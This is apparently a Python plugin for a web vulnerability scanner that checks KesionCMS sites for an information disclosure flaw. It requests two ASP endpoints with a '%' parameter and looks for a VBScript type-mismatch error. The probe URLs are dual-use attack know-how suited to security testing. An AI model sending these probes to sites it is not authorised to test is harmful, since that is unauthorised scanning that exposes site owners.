#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger

def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u''
        detail=detail.encode('utf8')
        domain=ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        url="/plus/Ajaxs.asp?action=GetRelativeItem&Key=%25"
        url1="/user/reg/regajax.asp?action=getcityoption&province=%25"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['path'],url)
        geturl1="%s://%s%s%s"%(ob['scheme'],domain,ob['path'],url1)       
        response,content=http.request(geturl, 'GET', headers=header)
        if content.find("Microsoft VBScript")>=0 and content.find("800a000d")>=0:
            request = getRequest(geturl, domain=ob['domain'])
            response = getResponse(response, content, "800a000d")
            result.append(getRecord(ob,geturl,ob['level'],detail,request,response))
        else:
            response,content=http.request(geturl1, 'GET', headers=header)
            if content.find("Microsoft VBScript")>=0 and content.find("800a000d")>=0:
                request = getRequest(geturl1, domain=ob['domain'])
                response = getResponse(response, content, "800a000d")
                result.append(getRecord(ob,geturl1,ob['level'],detail,request,response))
    except Exception, e:
        logger.error("File:kesionCMSinformationdisclosorce.py, run_domain function :" + str(e))
    return result

